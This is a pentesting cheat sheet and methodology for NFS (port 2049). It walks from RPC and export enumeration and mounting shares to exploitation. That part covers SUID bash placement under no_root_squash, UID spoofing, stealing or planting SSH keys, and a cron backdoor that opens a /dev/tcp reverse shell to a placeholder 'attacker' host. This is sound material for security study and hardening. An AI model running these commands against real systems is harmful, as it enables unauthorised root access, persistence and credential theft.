# NFS Enumeration (2049)

## Run nmap NFS scripts
```bash
nmap --script=nfs-* -p 2049 $IP
```

## Enumerate RPC services for NFS
```bash
nmap -p 111 --script=rpc-grind $IP
```

## Check RPC services with rpcinfo
```bash
rpcinfo -p $IP
```

## List NFS exports
```bash
showmount -e $IP
```

## Show all mount information
```bash
showmount -a $IP
```

## Show directories being exported
```bash
showmount -d $IP
```

## Create mount point directory
```bash
mkdir /tmp/nfs_mount
```

## Mount NFS share
```bash
mount -t nfs $IP:/sharename /tmp/nfs_mount
```

## Mount with NFSv3
```bash
mount -t nfs -o vers=3 $IP:/sharename /tmp/nfs_mount
```

## Mount with no root squash option
```bash
mount -t nfs -o vers=3,no_root_squash $IP:/sharename /tmp/nfs_mount
```

## List mounted share contents
```bash
ls -la /tmp/nfs_mount/
```

## Find readable files in mount
```bash
find /tmp/nfs_mount/ -type f -readable 2>/dev/null
```

## Find writable files in mount
```bash
find /tmp/nfs_mount/ -type f -writable 2>/dev/null
```

## Search for sensitive files
```bash
find /tmp/nfs_mount/ -name "*.txt" -o -name "*.conf" -o -name "*.log" 2>/dev/null
```

## Search for SSH keys
```bash
find /tmp/nfs_mount/ -name "id_rsa" -o -name "id_dsa" -o -name "authorized_keys" 2>/dev/null
```

## Copy SUID bash for privilege escalation
```bash
cp /bin/bash /tmp/nfs_mount/bash_suid
```

## Set SUID bit on bash copy
```bash
chmod +s /tmp/nfs_mount/bash_suid
```

## Unmount NFS share
```bash
umount /tmp/nfs_mount
```

---

# NFS Enumeration Methodology

## Initial Reconnaissance

1. Check if NFS port 2049 is open
2. Enumerate RPC services (port 111)
3. List exported shares with showmount
4. Mount accessible shares
5. Explore for sensitive files and misconfigurations
6. Test for privilege escalation opportunities

## RPC and NFS Relationship

**RPC Port Mapper (111):**
NFS relies on RPC (Remote Procedure Call). The port mapper on port 111 tells clients which ports NFS services are running on.

**Check RPC services:**
Use rpcinfo to see NFS-related services:
- nfs (the file system)
- mountd (mount daemon)
- nlockmgr (lock manager)
- status (status monitor)

## Listing NFS Exports

**showmount command:**
Queries the NFS server for exported file systems.

**Common options:**
- -e: Show export list
- -a: Show all mount points
- -d: Show directories

**What you learn:**
- Which directories are shared
- Network/host restrictions
- Access permissions

## Mounting NFS Shares

**Mount process:**
1. Create local mount point
2. Use mount command with NFS share path
3. Explore mounted directory

**NFS versions:**
- NFSv3: Older, more permissive
- NFSv4: Newer, better security

Try both if one doesn't work.

**Mount options:**
- vers=3 or vers=4: Specify NFS version
- no_root_squash: Don't map root to nobody (dangerous if enabled)

## No Root Squash Vulnerability

**What is root squashing:**
Security feature that maps root user to anonymous user (nobody) to prevent privilege escalation.

**If disabled (no_root_squash):**
- Root on client = root on server
- Can create SUID binaries
- Full control over share contents

**Exploitation:**
1. Create/copy executable to share
2. Set SUID bit as root
3. Execute from target system as non-privileged user
4. Gain root shell

## Permission Analysis

**Check file permissions:**
```bash
ls -la /tmp/nfs_mount/
```

**Look for:**
- World-writable directories
- Files owned by specific UIDs
- SUID/SGID binaries already present

## UID/GID Manipulation

**Creating matching user:**
If files are owned by UID 1001:
```bash
sudo useradd -u 1001 tempuser
sudo su tempuser
```

Now you can access files as that user.

**Why this works:**
NFS uses UID/GID for permissions, not usernames. Matching the numeric ID gives access.

## Sensitive File Discovery

**Configuration files:**
- .conf, .config, .ini, .xml
- May contain database credentials
- Application settings

**Credentials:**
- *password*, *passwd*, *credential*
- .env files
- Backup files (.bak, .old)

**SSH keys:**
- .ssh/id_rsa (private keys)
- .ssh/authorized_keys (for adding your key)
- .ssh/known_hosts (reveals other hosts)

**Bash history:**
- .bash_history
- May contain passwords in commands

## SSH Key Attacks

**If .ssh directory is writable:**
```bash
echo "your_public_key" >> /tmp/nfs_mount/home/user/.ssh/authorized_keys
```

Then SSH in:
```bash
ssh -i your_private_key user@$IP
```

**If private key found:**
```bash
cp /tmp/nfs_mount/home/user/.ssh/id_rsa ./
chmod 600 id_rsa
ssh -i id_rsa user@$IP
```

## File Injection Attacks

**Writable cron directories:**
```bash
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'" > /tmp/nfs_mount/etc/cron.d/backdoor
```

**Writable scripts:**
If you find startup scripts or frequently run scripts, inject reverse shell.

**Configuration file modification:**
Modify configs to execute your code.

## SUID Binary Placement

**Creating SUID bash:**
```bash
cp /bin/bash /tmp/nfs_mount/bash_suid
chmod +s /tmp/nfs_mount/bash_suid
```

**On target system:**
```bash
./bash_suid -p  # -p preserves privileges
```

**Requirements:**
- no_root_squash enabled on server
- Write access to share
- Ability to execute from share on target

## NFS Version Differences

**NFSv3:**
- Uses multiple RPC services
- mountd, nlockmgr, status
- More complex port structure
- Often more permissive

**NFSv4:**
- Simplified architecture
- Uses pseudo-filesystem (mount / then navigate)
- Better security defaults
- May have different export paths

**Try both versions when mounting fails.**

## Common NFS Ports

- 111/tcp,udp: RPC Port Mapper
- 2049/tcp,udp: NFS
- 4045/tcp,udp: NFS Lock Manager
- 4046/tcp,udp: NFS Status Monitor

Dynamic ports may also be used.

## NFS Configuration Files

**If you gain system access, check:**

**/etc/exports:**
Defines what is shared and to whom.

**Look for:**
- no_root_squash (dangerous)
- no_all_squash (preserves UIDs)
- rw (write access)
- Wide network ranges (0.0.0.0/0)

**/etc/fstab:**
Shows mounted NFS shares.

## Enumeration Checklist

- [ ] RPC service discovery
- [ ] Export enumeration with showmount
- [ ] Share mounting and exploration
- [ ] Permission testing (read/write/execute)
- [ ] Root squashing verification
- [ ] Sensitive file search
- [ ] SSH key discovery
- [ ] Configuration file analysis
- [ ] SUID binary placement (if no_root_squash)
- [ ] UID/GID matching attempts

## Common Misconfigurations

1. **no_root_squash enabled**
2. **World-writable exports**
3. **Overly permissive network ranges**
4. **no_all_squash preserving all UIDs**
5. **Sensitive directories exported** (home dirs, /etc, /root)
6. **No authentication required**

## Next Steps

Once NFS enumeration is complete:
1. Analyze file permissions and ownership
2. Search for credentials in discovered files
3. Test privilege escalation via UID manipulation or SUID
4. Look for SSH keys for lateral movement
5. Inject files for persistence if writable

---

# References

- https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting
- https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/storage_administration_guide/nfs-security
- https://tools.ietf.org/html/rfc3530 (NFSv4 RFC)
